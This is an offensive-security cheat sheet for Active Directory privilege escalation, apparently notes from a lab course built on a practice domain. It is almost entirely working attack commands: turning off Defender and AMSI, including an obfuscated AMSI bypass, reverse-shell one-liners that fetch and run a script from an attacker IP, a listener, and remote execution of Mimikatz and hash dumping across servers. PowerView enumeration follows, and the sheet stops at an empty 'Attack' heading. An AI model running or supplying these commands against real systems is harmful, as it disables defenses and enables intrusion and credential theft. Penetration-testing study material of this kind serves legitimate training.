# Privilege Escalation

# Active Directory

## Setup

Bypass Execution Policy
```powershell
powershell -ep bypass
```

Turn off AMSI 
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

AMSI bypass
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Rev shell
```powershell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

Listener
```powershell
powercat -l -v -p 443 -t 100
```

Run remote command
```powershell
$sess = New-PSSession -ComputerName dcorp-dc
Enter-PSSession $sess
Invoke-Command
Invoke-Command -Scriptblock {Get-Process } -ComputerName (Get Content <list_of_servers>)
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

Example of run remote command
```powershell
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Invoke-command -ScriptBlock {Invoke-Mimikatz} -Session $sess
Enter-PSSession $sess
```

Check language mode and app locker config
```powershell
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Copy files
```powershell
Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Download
```powershell
iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"))
```

## Enumeration

#### PowerView

Get all the users
```powershell
Get-NetUser
Get-NetUser | select -ExpandProperty samaccountname
$SecPassword = ConvertTo-SecureString 'Welcome2015' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('PWNY\jar-jar.binks', $SecPassword)
Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
Get-NetUser -Username student1
Get-UserProperty -Properties pwdlastset
Find-UserField -SearchField Description -SearchTerm "built"
```

Get OU
```powershell
Get-NetOU
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```

Get GPO
```powershell
Get-NetGPO
(Get-NetOU StudentMachines -FullData).gplink
Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
Get-NetGPO -GPOName "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"
Get-GPO -Guid [objectguid]
Find-GPOComputerAdmin - Computername dcorp-student1.dollarcorp.moneycorp.local
Find-GPOLocation -UserName student1 -Verbose
```

Get ACLs
```powershell
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights,AccessControlType
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
```

Get Domain Data
```powershell
Get-NetDomain
Get-NetDomain -Domain moneycorp.local
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."system access"
(Get-DomainPolicy -domain moneycorp.local)."system access"
Get-NetDomainController -Domain moneycorp.local
```

### Attack
